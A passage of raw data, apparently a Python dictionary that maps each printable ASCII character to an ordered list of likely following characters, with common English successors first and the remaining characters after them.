'1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '9': ['3', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], ';': [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '?': [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'A': ['n', 'P', 'm', ',', 'l', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'C': ['i', 'E', 'O', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'B': ['i', 'u', 'o', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'E': [' ', 'N', 'a', 'l', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'D': ['a', 'i', 'o', 'w', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x', 'y', 'z', '{', '|', '}', '~'], 'G': ['I', 'o', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'F': ['i', 'O', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'I': ['m', ' ', 'f', 'n', 't', 'E', 'N', 'Z', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'g', 'h', 'i', 'j', 'k', 'l', 'o', 'p', 'q', 'r', 's', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'H': ['e', 'E', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'K': ['.', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'M': ['o', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'L': ['O', 'o', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'O': ['G', 'L', 'o', 'N', 'R', 'n', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'H', 'I', 'J', 'K', 'M', 'O', 'P', 'Q', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'N': ['C', 'I', 'e', 'o', 'V', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'P': ['O', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'S': ['p', 'u', 't', 'o', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'q', 'r', 's', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'R': [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'T': ['h', 'o', 'H', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'i', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'W': ['e', 'i', 'a', 'E', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'V': ['E', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'Y': ['o', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'Z': ['E', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'a': ['t', 'n', 'l', 'r', ' ', 's', 'f', 'p', 'c', 'd', 'v', 'y', 'i', 'k', ',', '.', '?', 'b', 'g', 'm', 'q', 'u', 'w', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'e', 'h', 'j', 'o', 'x', 'z', '{', '|', '}', '~'], 'c': ['a', 'e', 'h', 'k', 'o', ' ', 'i', 't', 'l', 'r', 'u', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'm', 'n', 'p', 'q', 's', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'b': ['e', 'a', 'i', 'u', 'o', 'r', '!', ' ', 'l', 't', 'y', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'p', 'q', 's', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'e': [' ', 'r', 'n', 's', 'a', '.', 'm', 't', 'v', 'c', 'e', 'd', ',', 'l', 'f', 'i', 'x', 'o', 'p', 'y', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'g', 'h', 'j', 'k', 'q', 'u', 'w', 'z', '{', '|', '}', '~'], 'd': [' ', 'o', 'e', 'a', 's', 'i', '.', 'y', 'd', 'j', ',', 'r', 'v', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'f', 'g', 'h', 'k', 'l', 'm', 'n', 'p', 'q', 't', 'u', 'w', 'x', 'z', '{', '|', '}', '~'], 'g': [' ', 'e', 'h', 's', 'o', 'r', 'i', '.', 'g', ',', 'u', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'f', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'f': [' ', 'o', 'r', 'e', 'f', 'i', 'a', 'u', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'i': ['n', 't', 's', 'c', 'v', 'g', 'e', 'd', 'l', 'r', 'o', 'b', 'm', 'p', 'a', 'f', '.', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'h', 'i', 'j', 'k', 'q', 'u', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'h': ['e', 'a', 'i', ' ', 't', 'r', 'o', '.', 'u', '?', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 's', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'k': [' ', 'e', 'i', 'y', 'n', '.', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'j': ['u', 'a', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'm': ['e', ' ', 'a', 'i', 'b', ',', 'o', '.', 'u', 'y', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'l': ['l', 'e', ' ', 'i', 'o', ',', 'r', 'y', 'a', 'd', 's', '.', 'v', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'p', 'q', 't', 'u', 'w', 'x', 'z', '{', '|', '}', '~'], 'o': ['u', 'r', 'n', ' ', 'm', 't', 'f', 'o', 'w', 'd', 'i', 'k', 'p', 's', 'v', '.', 'c', 'b', 'g', 'h', 'l', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'e', 'j', 'q', 'x', 'y', 'z', '{', '|', '}', '~'], 'n': ['g', ' ', 'd', 'o', 't', 'e', 's', ',', 'i', 'k', '.', 'y', '?', 'a', 'c', 'm', 'l', 'u', 'v', 'n', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'f', 'h', 'j', 'p', 'q', 'r', 'w', 'x', 'z', '{', '|', '}', '~'], 'q': ['u', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'p': ['o', 'e', 'a', 'p', 'i', 'l', ' ', 'r', 't', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'q', 's', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 's': [' ', 't', 'e', ',', 'i', 'h', 'o', 'p', 'a', 's', 'u', 'k', 'c', '.', 'w', 'y', ';', '?', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 